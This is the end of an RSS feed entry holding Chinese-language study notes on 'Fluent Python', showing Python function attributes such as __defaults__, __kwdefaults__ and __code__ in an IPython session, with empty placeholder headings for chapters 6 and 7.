调用&lt;code class=&quot;highlighter-rouge&quot;&gt;tag(**my_tag)&lt;/code&gt;时,在my_tag前面加上&lt;code class=&quot;highlighter-rouge&quot;&gt;**&lt;/code&gt;,字典中的所有元素作为单个参数传入,同名键会绑定到对应的具名参数上,余下的则被&lt;code class=&quot;highlighter-rouge&quot;&gt;**attrs&lt;/code&gt;捕获&lt;/p&gt;

&lt;p&gt;6.函数对象有个&lt;code class=&quot;highlighter-rouge&quot;&gt;__defaults__&lt;/code&gt;属性,它的值是一个元组,里面保存着定位参数和关键字参数的默认值.仅限关键字参数的默认值在&lt;code class=&quot;highlighter-rouge&quot;&gt;__kwdefaults__&lt;/code&gt;属性中.然而,参数的名称在&lt;code class=&quot;highlighter-rouge&quot;&gt;__code__&lt;/code&gt;属性中,它的值是一个code对象引用,自身也有很多属性如下&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;In [31]: def tag(name,*content,cls=666,**attrs):
    ...:     print(&quot;name is:&quot;+name)

In [32]: tag.__defaults__

In [33]: tag.__kwdefaults__
Out[33]: {'cls': 666}

In [34]: tag.__code__
Out[34]: &amp;lt;code object tag at 0x102288540, file &quot;&amp;lt;ipython-input-31-7396c504e34a&amp;gt;&quot;, line 1&amp;gt;

In [35]: tag.__code__.co_name
Out[35]: 'tag'

In [36]: tag.__code__.co_names
Out[36]: ('print',)

In [37]: tag.__code__.co_varnames
Out[37]: ('name', 'cls', 'content', 'attrs')

In [38]: tag.__code__.co_argcount
Out[38]: 1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;第6章-使用一等函数实现设计模式&quot;&gt;第6章 使用一等函数实现设计模式&lt;/h3&gt;

&lt;p&gt;1.&lt;/p&gt;

&lt;h3 id=&quot;第7章-函数装饰器和闭包&quot;&gt;第7章 函数装饰器和闭包&lt;/h3&gt;

&lt;p&gt;1.&lt;/p&gt;
</description>
        <pubDate>Thu, 01 Mar 2018 00:00:00 -0500</pubDate>
        <link>http://3xp10it.cc/python/2018/03/01/%E6%B5%81%E7%95%85%E7%9A%84python%E7%AC%AC5-7%E7%AB%A0%E7%AC%94%E8%AE%B0/</link>
        <guid isPermaLink="true">http://localhost:4000/python/2018/03/01/%E6%B5%81%E7%95%85%E7%9A%84python%E7%AC%AC5-7%E7%AB%A0%E7%AC%94%E8%AE%B0/</guid>
        
        <category>python</category>
        
        
        <category>python</category>
        
      </item>
    
  </channel>
</rss>
